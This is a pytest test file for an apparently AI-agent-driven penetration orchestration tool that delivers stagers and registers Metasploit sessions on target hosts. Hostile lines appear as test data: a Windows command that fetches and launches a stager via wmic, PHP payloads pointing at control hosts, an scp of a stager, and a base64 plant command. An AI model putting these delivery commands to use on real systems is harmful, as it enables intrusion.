"""Offline walk tests use model choices and keep fact evidence separate from step reports."""

import sys
from pathlib import Path
import json
from copy import deepcopy
from uuid import uuid4

import pytest
from unittest.mock import create_autospec


from orchestration import delivery_setup  # noqa: E402
from agents.planner import service as planning  # noqa: E402
from orchestration import positions  # noqa: E402
from agents.verifier import service  # noqa: E402
from orchestration import session_flow  # noqa: E402
from orchestration import walk as walk_mod  # noqa: E402
from tests.test_run_plan_support import ROOT
for extra in (ROOT / "src", ROOT / "scripts"):
    if str(extra) not in sys.path:
        sys.path.insert(0, str(extra))

import run_plan                                              # noqa: E402
import run_lean_task                                         # noqa: E402
from tests.support import stub_callers                       # noqa: E402
from agents._model import client as model_mod                        # noqa: E402
from graph import rehydrate                                  # noqa: E402
from orchestration import graph_view, evidence
from agents.planner import service as planning     # noqa: E402
from orchestration import positions as positions_mod  # noqa: E402
from orchestration import preparation, reporting  # noqa: E402
from orchestration import session_flow                       # noqa: E402
from orchestration.graph_view import graph_nodes, needs      # noqa: E402
from agents.planner.service import (                         # noqa: E402
    choice_refusal,
    next_node,
    plan_next,
)
from orchestration.verification import assessment
from agents.verifier import backstops, service  # noqa: E402
from runtime import delivery_commands, dispatch               # noqa: E402
from runtime import session_delivery, session_registry        # noqa: E402
from runtime import credentials                              # noqa: E402
from runtime import session_io                               # noqa: E402
from runtime import session_resources, sessions               # noqa: E402
from skills import bind                                       # noqa: E402

from tests.test_run_plan_support import (
    CONSUMER_ID, FIXTURE_CALL_ID, credential_graph, delivery_fixture, plan_args,
    plan_harness, proved_result,
)
from orchestration import walk_step


def test_a_handle_the_console_already_owns_is_registered_not_migrated(tmp_path, monkeypatch):
    """A registered console session is reported unchanged and never triggers an implicit migration."""
    note = reporting.migration_note(
        recorded=[{"channel_id": "session-a", "kind": "console_session", "session_id": "1"}])
    assert note == {"state": "registered", "reason": "CONSOLE_SESSION_OBSERVED",
                    "handles": ["session-a"], "sessions": ["1"]}


def test_a_card_that_declares_a_session_must_deliver_one(tmp_path, monkeypatch):
    """Declared session delivery still gates step status even when the source session and output evidence exist."""
    delivered = {"state": "unknown", "reason": "SESSION_DELIVERY_NO_CALLBACK"}
    cancelled = []
    document = credential_graph(carried=True)
    closed, _ = plan_harness(monkeypatch, document, lambda *args, **kwargs: proved_result())
    facts = session_flow.produced_exec_facts(document, CONSUMER_ID)
    assert len(facts) == 1

    def card_for(node, _faces, **kwargs):
        return {"id": "delivery-fixture", "inputs": {"target_host": {"from": "graph"}},
                "delivers": [], "session": {"driver": "msf"}}, "", {}

    monkeypatch.setattr(bind, "bind", card_for)
    monkeypatch.setattr(session_io, 'ensure_console',
                        lambda *args, **kwargs: {"state": "ready"})
    stub_callers(monkeypatch, "begin_session_delivery",
                        lambda **kwargs: {"port": 1090, "serve_port": 1091, "payload": "fixture",
                                          "job": {}, "before": [], "command": "fixture delivery"}, callers=(delivery_setup,))
    finish = create_autospec(session_delivery.finish_session_delivery, return_value=dict(delivered))
    stub_callers(monkeypatch, "finish_session_delivery", finish, callers=(session_flow,))
    stub_callers(monkeypatch, "cancel_session_delivery",
                        lambda **kwargs: cancelled.append(kwargs["root"]), callers=(walk_step,))
    options = ["--control", "198.51.100.19", "--msf-rpc", "msf:pw@127.0.0.1:55553"]

    assert run_plan.main(plan_args(tmp_path / "run") + options) == 2
    finish.assert_called_once()
    assert (finish.call_args.kwargs["logical"], finish.call_args.kwargs["privilege"]) == facts[0]
    summary = json.loads((tmp_path / "run" / "plan_result.json").read_text(encoding="utf-8"))
    assert summary["passed"] is False
    row = summary["nodes"][CONSUMER_ID]
    assert row["status"] == "stopped", row
    assert row["reason"] == "SESSION_DELIVERY_FAILED"
    assert cancelled == [tmp_path / "run"]
    assert closed == [True]

    delivered = {"state": "completed", "reason": "ALREADY_A_CONSOLE_SESSION", "sessions": ["7"]}
    finish.reset_mock()
    finish.return_value = dict(delivered)
    assert run_plan.main(plan_args(tmp_path / "run2") + options) == 0
    finish.assert_called_once()
    assert (finish.call_args.kwargs["logical"], finish.call_args.kwargs["privilege"]) == facts[0]
    again = json.loads((tmp_path / "run2" / "plan_result.json").read_text(encoding="utf-8"))
    assert again["nodes"][CONSUMER_ID]["status"] == "proved"
    assert cancelled == [tmp_path / "run"]
    assert closed == [True, True]


def test_a_completed_handover_outweighs_a_conclusion_written_before_it(tmp_path, monkeypatch):
    """"No basis in what the step saw" is not counter-evidence against an engine-owned handover.

    walk-153 node 44: the chain ran, the engine registered the console session, and the step still
    stopped because the model had written `unsatisfied` -- a conclusion written before the
    registration existed for it to see. A report that *rejects* its own evidence (the parametrised
    unproved-account case) still wins, and a refused verification turn is never overruled.
    """
    delivered = {"state": "completed", "reason": "CONSOLE_SESSION_OBSERVED", "sessions": ["7"]}
    document = credential_graph(carried=True)

    def driver(card, task, scope, executor, **kwargs):
        return {"status": "model_reported", "claimed_verdict": "unsatisfied",
                "citations": [{"call_id": FIXTURE_CALL_ID}],
                "reason": "MODEL_CLAIM_NOT_MACHINE_VERIFIED"}

    plan_harness(monkeypatch, document, driver)
    facts = session_flow.produced_exec_facts(document, CONSUMER_ID)
    assert len(facts) == 1

    def card_for(node, _faces, **kwargs):
        return {"id": "delivery-fixture", "inputs": {"target_host": {"from": "graph"}},
                "delivers": [], "session": {"driver": "msf"}}, "", {}

    monkeypatch.setattr(bind, "bind", card_for)
    monkeypatch.setattr(session_io, 'ensure_console',
                        lambda *args, **kwargs: {"state": "ready"})
    stub_callers(monkeypatch, "begin_session_delivery",
                        lambda **kwargs: {"port": 1090, "serve_port": 1091, "payload": "fixture",
                                          "job": {}, "before": [], "command": "fixture delivery"}, callers=(delivery_setup,))
    finish = create_autospec(session_delivery.finish_session_delivery, return_value=dict(delivered))
    stub_callers(monkeypatch, "finish_session_delivery", finish, callers=(session_flow,))
    stub_callers(monkeypatch, "cancel_session_delivery", lambda **kwargs: None, callers=(walk_step,))
    options = ["--control", "198.51.100.19", "--msf-rpc", "msf:pw@127.0.0.1:55553"]

    assert run_plan.main(plan_args(tmp_path / "run") + options) == 0
    finish.assert_called_once()
    assert (finish.call_args.kwargs["logical"], finish.call_args.kwargs["privilege"]) == facts[0]
    summary = json.loads((tmp_path / "run" / "plan_result.json").read_text(encoding="utf-8"))
    assert summary["nodes"][CONSUMER_ID]["status"] == "proved"


def test_session_via_relay_is_accepted_and_other_schemes_are_not():
    from skills import lean

    base = ("---\nname: exploit-fixture\ndescription: x\nid: exploit.fixture\n"
            "kind: method\nruns_at: base\ndelivers: [\"evidence\"]\ninputs: {}\n"
            "tools: [\"shell\"]\n")
    fields, body = lean.parse(base + 'session: {"driver":"msf","via":"relay"}\n---\nbody\n')
    assert fields["session"] == {"driver": "msf", "via": "relay"}
    with pytest.raises(ValueError) as error:
        lean.parse(base + 'session: {"driver":"msf","via":"carrier-pigeon"}\n---\nbody\n')
    assert "LEAN_CARD_SESSION_VIA_INVALID" in str(error.value)
    assert body.strip() == "body"


def test_a_position_declaration_needs_a_recipe_not_a_host_name():
    """The card says what shape the entry is; where it lives is the graph's fact, not the card's."""
    from skills import lean

    base = ("---\nname: exploit-fixture\ndescription: x\nid: exploit.fixture\n"
            "kind: method\nruns_at: position\ndelivers: [\"evidence\"]\ninputs: {}\n"
            "tools: [\"shell\"]\n")
    fields, _body = lean.parse(
        base + 'provides_position: {"kind":"web","recipe":{"kind":"asset_command",'
               '"asset":"/tmp/x.py","url_args":["-u","http://{host}:{port}/"],'
               '"command_flag":"-c","platform":"linux"}}\n---\nbody\n')
    assert fields["provides_position"]["recipe"]["asset"] == "/tmp/x.py"
    with pytest.raises(ValueError) as error:
        lean.parse(base + 'provides_position: {"kind":"web","recipe":{"kind":"http"}}\n---\nbody\n')
    assert "LEAN_CARD_POSITION_RECIPE_INVALID" in str(error.value)


def test_a_position_declaration_still_needs_a_usable_recipe():
    """The relaxed host rule did not relax the recipe: a shape we cannot run is still refused."""
    from skills import lean

    base = ("---\nname: exploit-fixture\ndescription: x\nid: exploit.fixture\n"
            "kind: method\nruns_at: position\ndelivers: [\"evidence\"]\ninputs: {}\n"
            "tools: [\"shell\"]\n")
    with pytest.raises(ValueError) as error:
        lean.parse(base + 'provides_position: {"kind":"web","recipe":{"kind":"asset_command",'
                          '"asset":"relative/x.py","url_args":["-u"],"command_flag":"-c",'
                          '"platform":"linux"}}\n---\nbody\n')
    assert "LEAN_CARD_POSITION_RECIPE_INVALID" in str(error.value)


def test_the_credential_route_gets_a_real_delivery_command():
    """走凭据路线的节点必须拿到"取回 stager 并起它"的真命令，不是占位符。

    2026-10-06 walk-51 实测：`delivery_command` 是 `echo agv-entry-ok`，真正的动作只写在给 web 入口的 PHP 里，
    于是 node 44 根本没有可用的交付动作、如实记 SESSION_DELIVERY_FAILED。取件地址必须是跳板在目标侧的地址。
    """
    command = delivery_commands.windows_delivery_command(fetch_host="192.168.93.20", fetch_port=2092,
                                                stager="agv_session.exe",
                                                remote=r"C:\Windows\Temp\agv_session.exe")
    assert "http://192.168.93.20:2092/agv_session.exe" in command      # 跳板在目标侧，不是控制端
    assert "wmic process call create" in command                      # 真的把它起起来
    assert r"C:\Windows\Temp\agv_session.exe" in command
    assert "agv-entry-ok" not in command                              # 不许再是占位符


def test_two_delivery_plans_never_share_one_stager_file():
    """每个计划一份按端口命名的 stager：URL 指向哪份文件、那份文件给哪个端口编的，绑死。

    2026-10-06 walk-62 实测：共用 `/tmp/agv_session.exe` 时，node 19 armed 把 node 7 留下的那份覆盖了，
    而 node 7 失败后它的取件服务还在跑 —— pc1 上的马连到了 1090（上一格的门），控制台 0 条会话。
    """
    assert session_flow.stager_path(1090) != session_flow.stager_path(1092)
    assert session_flow.stager_path(1092) == "/tmp/agv_session_1092.exe"
    assert session_flow.stager_path(1080, windows=False) == "/tmp/agv_session_1080.py"


def test_the_ports_of_handlers_that_hold_a_session_are_protected_from_reaping():
    """收残留 handler 时，**有会话挂靠的端口不许碰** —— 判据要认两种回复形状。

    2026-10-06 walk-62 实测：会话 5 挂在 1080（tunnel_local 192.168.52.128:1080），
    而回复的形状是 `{sid: info}`；只认 `{"sessions": {...}}` 的写法会得到"没有会话挂靠"，
    接着把正在用的 handler 停掉 —— 为了清残留而伤了活会话，比不清更糟。
    """
    shapes = [
        {"5": {"tunnel_local": "192.168.52.128:1080", "tunnel_peer": "192.168.52.10:54066"}},
        {"sessions": {"5": {"tunnel_local": "192.168.52.128:1080"}}},
        {},
    ]
    for listing in shapes:
        ports = session_resources._handler_ports_with_sessions(lambda method, *params, _l=listing: dict(_l))
        if listing:
            assert 1080 in ports, listing
        else:
            assert ports == set()


def test_a_step_that_declares_a_session_is_not_proved_when_delivery_was_never_prepared():
    """声明"这一步交出一条会话"的步骤：交付没准备好 → **按未成立记**，不是免检。

    2026-10-07 桥评审点名：先前只在 `proved and plan_session` 时验收交付，
    缺配置或 `begin_session_delivery()` 返回空时整条门禁被跳过。
    """
    import run_plan

    #: 准备好了 → 原样放行
    assert session_flow.delivery_gate(proved=True, declares_session=True, prepared=True,
                                  rpc_ready=True) == (True, "")
    #: 声明了要交、但交付计划是空的 → 未成立，且原因具名
    proved, reason = session_flow.delivery_gate(proved=True, declares_session=True, prepared=False,
                                            rpc_ready=True)
    assert proved is False and reason == "DELIVERY_PLAN_EMPTY"
    #: 连 rpc/控制端都没有 → 另一个具名原因
    proved, reason = session_flow.delivery_gate(proved=True, declares_session=True, prepared=False,
                                            rpc_ready=False)
    assert proved is False and reason == "MIGRATION_NOT_CONFIGURED"
    #: 这张卡压根不声明会话 → 门禁不管它（不许把普通步骤误判）
    assert session_flow.delivery_gate(proved=True, declares_session=False, prepared=False,
                                  rpc_ready=False) == (True, "")
    #: 本来就没成立的步骤 → 不改判（不用"未准备"去顶替它自己的失败原因）
    assert session_flow.delivery_gate(proved=False, declares_session=True, prepared=False,
                                  rpc_ready=True) == (False, "")


def test_finish_produced_session_uses_the_real_delivery_signature(tmp_path, monkeypatch):
    """One output fact reaches the real receiver's argument binding without transport I/O."""
    stub_callers(monkeypatch, "produced_exec_facts",
        lambda document, node_id: [("web2_docker", "www_data")], callers=(positions, session_flow))

    result = session_flow._finish_produced_session(
        document=object(), node_id="28",
        host_map={"web2_docker": "192.0.2.10"},
        executor=None, plan={"owner": "invalid"}, rpc_conf={}, root=tmp_path)

    assert result == {
        "state": "unknown",
        "reason": "SESSION_DELIVERY_OWNER_INVALID",
    }


@pytest.mark.parametrize("facts", [
    [],
    [("web2_docker", "www_data")],
])
def test_finish_produced_session_rejects_unknown_arguments_before_lookup(
        tmp_path, monkeypatch, facts):
    """An early missing-fact return cannot hide an invalid caller argument."""
    from unittest.mock import Mock, create_autospec

    produced = Mock(return_value=facts)
    finish = create_autospec(
        session_delivery.finish_session_delivery,
        return_value={"state": "completed"})
    stub_callers(monkeypatch, "produced_exec_facts", produced, callers=(positions, session_flow))
    stub_callers(monkeypatch, "finish_session_delivery", finish, callers=(session_flow,))

    with pytest.raises(TypeError, match="carrier"):
        session_flow._finish_produced_session(
            document=object(), node_id="28",
            host_map={"web2_docker": "192.0.2.10"},
            executor=None, plan={"owner": "invalid"}, rpc_conf={}, root=tmp_path,
            carrier={"channel_id": "existing-entry"})

    produced.assert_not_called()
    finish.assert_not_called()


def test_delivery_persists_recovery_plan_before_prepare(tmp_path, monkeypatch):
    """Delivery acquires declared resources only after a recoverable plan is on disk."""
    arguments, calls = delivery_fixture(tmp_path, monkeypatch)
    plan = session_delivery.begin_session_delivery(**arguments)
    stored = json.loads((tmp_path / "delivery" / plan["owner"] / "plan.json").read_text())
    assert stored["state"] == "prepared" and stored["declaration"] == arguments["declaration"]
    assert calls == ["echo prepare"]
    state = json.loads((session_registry._resource_root(tmp_path) / "sessions.json").read_text())
    assert {row["owner"] for row in state["resources"].values()} == {plan["owner"]}


def test_delivery_rejects_an_unrecoverable_secret_plan(tmp_path, monkeypatch):
    """A cleanup plan must use material references instead of persisting a private RPC credential."""
    arguments, calls = delivery_fixture(tmp_path, monkeypatch)
    arguments["declaration"]["command"] = "echo fixture-rpc-secret"
    with pytest.raises(ValueError, match="SESSION_DELIVERY_PLAN_CONTAINS_SECRET"):
        session_delivery.begin_session_delivery(**arguments)
    assert calls == [] and list((tmp_path / "delivery").glob("*/plan.json")) == []


def test_delivery_requires_its_declaration_before_any_rpc(tmp_path, monkeypatch):
    """A missing delivery declaration is refused rather than inventing a payload or listener."""
    arguments, calls = delivery_fixture(tmp_path, monkeypatch)
    arguments["declaration"] = None
    monkeypatch.setattr(session_io, "rpc_call",
                        lambda *a, **k: pytest.fail("missing declaration must not contact RPC"))
    with pytest.raises(ValueError, match="SESSION_DELIVERY_DECLARATION_REQUIRED"):
        session_delivery.begin_session_delivery(**arguments)
    assert calls == []


def test_delivery_requires_authoritative_attempt_correlation(tmp_path, monkeypatch):
    """Same-host and same-type metadata alone cannot identify this delivery attempt."""
    arguments, calls = delivery_fixture(tmp_path, monkeypatch)
    del arguments["declaration"]["expected"]["exploit_uuid"]
    monkeypatch.setattr(session_io, "rpc_call",
                        lambda *a, **k: pytest.fail("missing correlation must not contact RPC"))
    with pytest.raises(ValueError, match="SESSION_DELIVERY_CORRELATION_REQUIRED"):
        session_delivery.begin_session_delivery(**arguments)
    assert calls == []


def test_delivery_ignores_another_attempt_on_the_same_host(tmp_path, monkeypatch):
    """Only a callback carrying the exact declared attempt identity may be adopted."""
    arguments, calls = delivery_fixture(tmp_path, monkeypatch)
    plan = session_delivery.begin_session_delivery(**arguments)
    expected = arguments["declaration"]["expected"]
    listing = {"other": dict(expected, exploit_uuid="different-attempt"),
               "ours": dict(expected)}
    monkeypatch.setattr(session_io, "rpc_call",
                        lambda *a, **k: lambda *a, **k: listing)
    adopted = []
    def register(root, **kwargs):
        adopted.append(kwargs)
        return {"channel_id": "our-binding", "endpoint": {"host": "127.0.0.1", "port": 55553,
                                                          "ssl": False}, "session_id": "ours",
                "session_type": "meterpreter", "uuid": "fixture-incarnation"}
    monkeypatch.setattr(sessions, "register_session", register)
    def probe(row, **kwargs):
        """Publish the shape a delivery needs: carrier, frozen binding, and this call's identity."""
        target = kwargs.get("evidence_out")
        binding = {key: str(row.get(key) or "") for key in
                   ("channel_id", "kind", "session_id", "session_type", "platform", "host",
                    "logical", "uuid")}
        binding["endpoint"] = row.get("endpoint")
        if isinstance(target, dict):
            target.update({
                "carrier": row["channel_id"], "binding": binding, "state": "alive",
                "call_id": "call-probe",
                "identity": {"call_id": "call-identity", "user": "fixture-user"},
                "identity_call_id": "call-identity"})
        return True, "SESSION_PROBE_CONFIRMED"
    monkeypatch.setattr(sessions, "probe", probe)
    result = session_delivery.finish_session_delivery(
        executor=None, plan=plan, rpc_conf={}, root=tmp_path, host="192.0.2.7",
        logical="fixture-host", privilege="user", node_id="fixture")
    assert result["state"] == "completed" and result["sessions"] == ["ours"]
    assert result["observation"] == "SESSION_PROBE_CONFIRMED"
    assert result["carrier"] == "our-binding"
    assert adopted[0]["expected"] == expected


def test_a_delivery_that_was_never_observed_does_not_count_as_completed(tmp_path, monkeypatch):
    """A registered row is not a usable position until the session itself answers."""
    arguments, calls = delivery_fixture(tmp_path, monkeypatch)
    plan = session_delivery.begin_session_delivery(**arguments)
    expected = arguments["declaration"]["expected"]
    listing = {"ours": dict(expected)}
    monkeypatch.setattr(session_io, "rpc_call",
                        lambda *a, **k: lambda *a, **k: listing)
    monkeypatch.setattr(sessions, "register_session",
                        lambda root, **kwargs: {"channel_id": "our-binding",
                                                "endpoint": {"host": "127.0.0.1", "port": 55553,
                                                             "ssl": False},
                                                "session_id": "ours",
                                                "session_type": "meterpreter"})
    monkeypatch.setattr(sessions, "probe",
                        lambda row, **kwargs: (False, "CONSOLE_SESSION_GONE"))
    result = session_delivery.finish_session_delivery(
        executor=None, plan=plan, rpc_conf={}, root=tmp_path, host="192.0.2.7",
        logical="fixture-host", privilege="user", node_id="fixture")
    assert result["state"] == "failed"
    assert result["reason"].startswith("SESSION_DELIVERY_MATCHED_REGISTERED_SESSION_GONE")


def test_registration_checks_expected_metadata_before_mutation(tmp_path, monkeypatch):
    """A changed authoritative reply between selection and registration leaves no binding."""
    from runtime import msfservice
    from types import SimpleNamespace
    from runtime import session_io
    monkeypatch.setattr(session_io, "_endpoint", lambda value: object())
    monkeypatch.setattr(msfservice, "client_for", lambda *a, **k: object())
    monkeypatch.setattr(msfservice, "session_shape", lambda *a, **k: {
        "type": "shell", "session_host": "192.0.2.7", "platform": "linux",
        "uuid": "new-session", "exploit_uuid": "other-attempt"})
    with pytest.raises(ValueError, match="SESSION_OBSERVATION_CHANGED"):
        sessions.register_session(
            tmp_path, endpoint={"host": "127.0.0.1", "port": 55553, "ssl": False},
            session_id="1", logical="fixture-host",
            capabilities={"capacity": {"max_bytes": 4096, "source": "fixture"},
                          "shell_ready": True},
            expected={"exploit_uuid": "fixture-attempt"})
    assert session_registry.snapshot(tmp_path) == []


def test_a_handed_over_delivery_is_waited_for_even_when_the_model_hedges(monkeypatch):
    """The run's own record says whether the parked stager was used; the model's verdict is not
    the trigger. walk-133 node 12: redis planted the key, ssh started the stager, the model
    answered "uncertain", and the session that arrived was never claimed.
    """
    plan = {"declaration": {"materials": {"stager": "/tmp/agv-materials/agv_abc.bin",
                                          "key_path": "/tmp/agv-materials/agv_abc.key"}}}
    used = [{"request": {"tool": "cmd",
                         "cmd": "scp /tmp/agv-materials/agv_abc.bin root@host:/tmp/agv_abc"}}]
    stub_callers(monkeypatch, "_registered_receipts", lambda run_dir: (used, []), callers=(service, session_flow))
    assert session_flow.delivery_was_issued(plan, "run") is True
    stub_callers(monkeypatch, "_registered_receipts",
                        lambda run_dir: ([{"request": {"tool": "cmd", "cmd": "whoami"}}], []), callers=(service, session_flow))
    assert session_flow.delivery_was_issued(plan, "run") is False
    assert session_flow.delivery_was_issued({"declaration": {}}, "run") is True
    #: A web entry carries the file name, never the control-end path.
    web = [{"request": {"tool": "stage",
                        "payload": "<?php $u='http://192.0.2.128:1082/agv_abc.bin';?>"}}]
    stub_callers(monkeypatch, "_registered_receipts", lambda run_dir: (web, []), callers=(service, session_flow))
    assert session_flow.delivery_was_issued(plan, "run") is True


def test_a_missed_callback_says_which_new_sessions_showed_up():
    """"Nothing came back" and "something came back but not what we expected" must be told apart.

    walk-142 recorded only SESSION_DELIVERY_NO_MATCH while an isolated replay worked every time;
    that is not enough to decide between a helper that never started and an expectation that is
    wrong, so the receipt now carries both the expectation and any new sessions.
    """
    plan = {"before": ["1"],
            "declaration": {"expected": {"session_host": "192.0.2.10",
                                         "tunnel_local": "192.0.2.128:1080",
                                         "type": "meterpreter"},
                            "handler": {"lport": 1080}}}
    listing = {"1": {"type": "meterpreter", "session_host": "192.0.2.10"},
               "2": {"type": "meterpreter", "session_host": "192.0.2.30",
                     "tunnel_local": "192.0.2.128:1081"}}

    from types import SimpleNamespace

    class Executor:
        def __call__(self, argv, timeout):
            return SimpleNamespace(stdout="1\n", stderr="")

    receipt = session_delivery.delivery_no_match_receipt(plan, listing, executor=Executor())
    assert receipt["reason"] == "SESSION_DELIVERY_NO_MATCH"
    assert receipt["expected"]["tunnel_local"] == "192.0.2.128:1080"
    assert [row["session_id"] for row in receipt["new_sessions"]] == ["2"]
    assert receipt["new_sessions"][0]["tunnel_local"] == "192.0.2.128:1081"
    assert receipt["listener_lines"] == "1"
    bare = session_delivery.delivery_no_match_receipt(plan, None)
    assert bare["new_sessions"] == [] and "listener_lines" not in bare

def test_the_delivery_hands_over_the_plant_command_and_the_right_instruction(tmp_path, monkeypatch):
    """The payload to plant and the route-specific instruction come from the declaration's materials."""
    seen = {}
    document = credential_graph(carried=True)
    payload = "<?php $u='http://control.invalid/x.bin';echo 1;?>"

    def driver(card, task, scope, executor, **kwargs):
        seen.update(task["inputs"])
        return proved_result()

    plan_harness(monkeypatch, document, driver)

    def card_for(node, _faces, **kwargs):
        return {"id": "delivery-fixture", "inputs": {"target_host": {"from": "graph"}},
                "delivers": [], "session": {"driver": "msf"}}, "", {}

    monkeypatch.setattr(bind, "bind", card_for)
    monkeypatch.setattr(session_io, 'ensure_console',
                        lambda *args, **kwargs: {"state": "ready"})
    stub_callers(monkeypatch, "begin_session_delivery",
                        lambda **kwargs: {"command": "echo AGV_DELIVERY_TRIGGER",
                                          "declaration": {"materials": {"stage_payload": payload}}}, callers=(delivery_setup,))
    stub_callers(monkeypatch, "finish_session_delivery",
                        lambda **kwargs: {"state": "completed", "sessions": ["7"]}, callers=(session_flow,))
    stub_callers(monkeypatch, "cancel_session_delivery", lambda **kwargs: None, callers=(walk_step,))
    options = ["--control", "198.51.100.19", "--msf-rpc", "msf:pw@127.0.0.1:55553"]
    assert run_plan.main(plan_args(tmp_path / "run") + options) == 0
    assert seen.get("delivery_command") == "echo AGV_DELIVERY_TRIGGER"
    assert seen.get("delivery_plant_path") == "/tmp/agv.png"
    plant = str(seen.get("delivery_plant_command") or "")
    assert plant.startswith("printf %s ") and plant.endswith("| base64 -d > /tmp/agv.png")
    assert "delivery_payload" in str(seen.get("must_deliver_session") or "")


# Session delivery regressions: preserve all earlier assertions unchanged.
@pytest.fixture
def repeat_delivery_case(tmp_path, monkeypatch):
    from types import SimpleNamespace
    from runtime import msfservice, session_delivery_finish

    monkeypatch.setenv("AGV_MSF_RPC", "msf:fixture@127.0.0.1:55553")
    owner = "delivery-" + "a" * 32
    expected = {"session_host": "192.0.2.30", "type": "meterpreter",
                "tunnel_local": "192.0.2.128:1083"}
    endpoint = {"host": "127.0.0.1", "port": 55553, "ssl": False}
    capabilities = {"capacity": {"max_bytes": 4096, "source": "fixture"},
                    "shell_ready": True}
    plan = {"owner": owner, "node_id": "19", "state": "prepared",
            "before": ["1", "2"], "endpoint": endpoint,
            "declaration": {"expected": expected, "capabilities": capabilities}}
    session_delivery_finish._save_delivery_plan(tmp_path, plan)
    listing = {sid: dict(expected, uuid="uuid-" + sid, platform="windows")
               for sid in ("1", "2", "10", "3", "4")}
    listing["foreign"] = dict(expected, tunnel_local="192.0.2.128:1081")
    registered, probed = [], []
    monkeypatch.setattr(session_registry, "_resource_root",
                        lambda root: tmp_path / "resources")
    monkeypatch.setattr(session_io, "rpc_call",
                        lambda **kwargs: lambda *args, **options: deepcopy(listing))
    monkeypatch.setattr(msfservice, "client_for",
                        lambda *args, **kwargs: object())
    monkeypatch.setattr(msfservice, "session_shape",
                        lambda client, sid, **kwargs: dict(listing[sid]))
    real_register = sessions.register_session

    def register(root, **kwargs):
        registered.append(kwargs["session_id"])
        return real_register(root, **kwargs)

    def probe(row, **kwargs):
        probed.append(row["session_id"])
        frozen = {key: str(row.get(key) or "") for key in
                  ("channel_id", "kind", "session_id", "session_type",
                   "platform", "host", "logical", "uuid")}
        frozen["endpoint"] = deepcopy(row["endpoint"])
        kwargs["evidence_out"].update(
            carrier=row["channel_id"], binding=frozen, state="alive",
            call_id="call-probe", identity_call_id="call-identity",
            identity={"call_id": "call-identity", "user": "nt authority\\system",
                      "environment": "host", "hostname": "PC1"})
        return True, "SESSION_PROBE_CONFIRMED"

    monkeypatch.setattr(sessions, "register_session", register)
    monkeypatch.setattr(sessions, "probe", probe)
    options = dict(executor=None, plan=plan, rpc_conf={}, root=tmp_path,
                   host=expected["session_host"], logical="pc1",
                   privilege="system", node_id="19")
    return SimpleNamespace(root=tmp_path, plan=plan, listing=listing,
                           registered=registered, probed=probed,
                           options=options, real_register=real_register)


@pytest.mark.parametrize("reverse", [False, True])
def test_same_handler_repeat_callbacks_are_deterministic(repeat_delivery_case, reverse):
    case = repeat_delivery_case
    if reverse:
        rows = list(case.listing.items())[::-1]
        case.listing.clear()
        case.listing.update(rows)
    receipt = session_delivery.finish_session_delivery(**case.options)
    assert receipt["state"] == "completed"
    assert receipt["node_id"] == "19"
    assert receipt["delivery_owner"] == case.plan["owner"]
    assert receipt["sessions"] == ["3"]
    assert receipt["callback_selection"] == "lowest_session_id"
    assert [row["session_id"] for row in receipt["repeat_callbacks"]] == ["4", "10"]
    assert receipt["repeat_callbacks"][0] == {
        "session_id": "4", "uuid": "uuid-4", "type": "meterpreter",
        "session_host": "192.0.2.30", "tunnel_local": "192.0.2.128:1083",
        "platform": "windows"}
    assert case.registered == case.probed == ["3"]
    assert len(session_registry.snapshot(case.root)) == 1
    stored = json.loads((case.root / "delivery" / case.plan["owner"] /
                         "plan.json").read_text(encoding="utf-8"))
    assert stored["delivery_receipt"] == receipt
    verdict = backstops.backstop_exec_code(
        criterion={"ref": "6", "logical": "pc1", "privilege": "system"},
        sessions=session_registry.snapshot(case.root), node_id="19",
        host_map={"pc1": "192.0.2.30"}, delivery=receipt,
        expected_delivery_owner=case.plan["owner"])
    assert verdict["verdict"] == "TRUE"


def test_repeat_callback_registration_reuses_the_existing_carrier(repeat_delivery_case):
    case = repeat_delivery_case
    kept = case.real_register(
        case.root, endpoint=case.plan["endpoint"], session_id="1",
        logical="pc1", source_node="7", source_call="delivery-" + "b" * 32,
        capabilities=case.plan["declaration"]["capabilities"],
        expected=case.plan["declaration"]["expected"], privilege_term="system")
    receipt = session_delivery.finish_session_delivery(**case.options)
    assert receipt["state"] == "completed"
    assert receipt["received_session"]["session_id"] == "3"
    assert receipt["retained_session"]["session_id"] == "1"
    assert receipt["retained_session"]["source_node"] == "7"
    assert receipt["carrier"] == kept["channel_id"]
    assert case.registered == ["3"] and case.probed == ["1"]
    assert len(session_registry.snapshot(case.root)) == 1
    registry = session_registry._registry(case.root)
    assert len(registry["dropped"]) == 1
    assert registry["dropped"][0]["source_call"] == case.plan["owner"]
    assert registry["dropped"][0]["source_node"] == "19"


@pytest.mark.parametrize("change", [
    {"session_host": "192.0.2.99"},
    {"type": "shell"},
    {"platform": "linux"},
])
def test_same_handler_contradiction_is_not_collapsed(repeat_delivery_case, change):
    case = repeat_delivery_case
    case.listing["4"].update(change)
    receipt = session_delivery.finish_session_delivery(**case.options)
    assert receipt["state"] == "unknown"
    assert "SESSION_DELIVERY_HANDLER_CONFLICT" in receipt["reason"]
    assert receipt["node_id"] == "19"
    assert receipt["delivery_owner"] == case.plan["owner"]
    assert case.registered == case.probed == []
    verdict = backstops.backstop_exec_code(
        criterion={"ref": "6", "logical": "pc1", "privilege": "system"},
        node_id="19", delivery=receipt,
        expected_delivery_owner=case.plan["owner"])
    assert verdict["reason"] == "EXEC_DELIVERY_NOT_COMPLETED"


@pytest.mark.parametrize("state", ["prepared", "cleaned", "not_started"])
def test_handler_owner_conflict_and_terminal_port_reuse(repeat_delivery_case, state):
    from runtime import session_delivery_finish
    case = repeat_delivery_case
    other = deepcopy(case.plan)
    other.update(owner="delivery-" + "b" * 32, node_id="7", state=state)
    session_delivery_finish._save_delivery_plan(case.root, other)
    receipt = session_delivery.finish_session_delivery(**case.options)
    if state == "prepared":
        assert receipt["state"] == "unknown"
        assert "SESSION_DELIVERY_OWNER_CONFLICT" in receipt["reason"]
        assert case.registered == case.probed == []
    else:
        assert receipt["state"] == "completed"
        assert case.registered == case.probed == ["3"]


def test_repeat_callback_without_handler_correlation_stays_ambiguous(repeat_delivery_case):
    from runtime import session_delivery_finish
    case = repeat_delivery_case
    del case.plan["declaration"]["expected"]["tunnel_local"]
    session_delivery_finish._save_delivery_plan(case.root, case.plan)
    receipt = session_delivery.finish_session_delivery(**case.options)
    assert receipt["state"] == "unknown"
    assert "SESSION_DELIVERY_AMBIGUOUS" in receipt["reason"]
    assert case.registered == case.probed == []


@pytest.mark.parametrize("replacement", ["lower_id", "changed_uuid", "missing"])
def test_repeat_recovery_keeps_the_received_incarnation(
        repeat_delivery_case, monkeypatch, replacement):
    case = repeat_delivery_case
    with monkeypatch.context() as interrupted:
        def stop(*args, **kwargs):
            raise SystemExit("received before registration")
        interrupted.setattr(sessions, "register_session", stop)
